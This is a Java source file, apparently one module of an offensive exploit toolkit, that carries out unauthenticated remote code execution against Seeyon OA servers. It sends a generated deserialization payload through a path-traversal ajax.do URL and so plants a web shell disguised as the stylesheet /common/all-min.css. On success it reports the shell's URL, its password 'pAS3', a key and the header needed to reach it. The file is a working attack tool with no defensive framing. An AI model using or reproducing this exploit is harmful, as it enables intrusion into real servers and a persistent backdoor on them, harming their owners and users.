package exp.seeyon;

import core.GeneratePayload;
import exp.AttackBase;
import exp.BaseExp;
import okhttp3.Response;
import utils.Util;
import utils.okhttplib.OkHttp;

import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;

public class Seeyon_Unauthorized_RCE extends BaseExp implements AttackBase {

    public void attack(String target, String gadgetType, String payloadType, String trojanType)  {
        byte[] payload = null;
        try {
            payload = GeneratePayload.generatePayloadByte(gadgetType, payloadType, trojanType);
            HashMap<String, String> header = new HashMap<String, String>();
            header.put("Cache-Control", "max-age=0");
            header.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36");
            String mime = "application/x-www-form-urlencoded; charset=utf-8";
            this.launch(target +
                            "/autoinstall.do.zxc/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip",
                    new String(payload), mime, header);
            header.put("X-Requested-With", "XmlHTTPRequest");
            Response response = this.launch(target + "/common/all-min.css", header);
            String bodyResult = response.body().string();
            response.close();
            if (bodyResult.contains("Success")) {
                Util.messageQueue.add(String.format("Shell_Url： %s\n", target + "/common/all-min.css"));
                Util.messageQueue.add(String.format("PassWord： pAS3\n"));
                Util.messageQueue.add(String.format("Key： key\n"));
                Util.messageQueue.add(String.format("header： X-Requested-With:XMLHTTPRequest\n"));
                Util.messageQueue.add("---------------------------\n");
            }else {
                Util.messageQueue.add("注入失败");
            }

        }catch (Exception e){
            Util.messageQueue.add(String.format("注入过程发生错误： %s", e.getMessage()));
        }
    }

    @Override
    public void run(HashMap<String, String> params) {
        String target = params.get("target");
        String payloadType = params.get("payloadType");
        String gadgetType = params.get("gadgetType");
        String trojanType = params.get("trojanType");
        this.attack(target, gadgetType, payloadType, trojanType);
    }

}
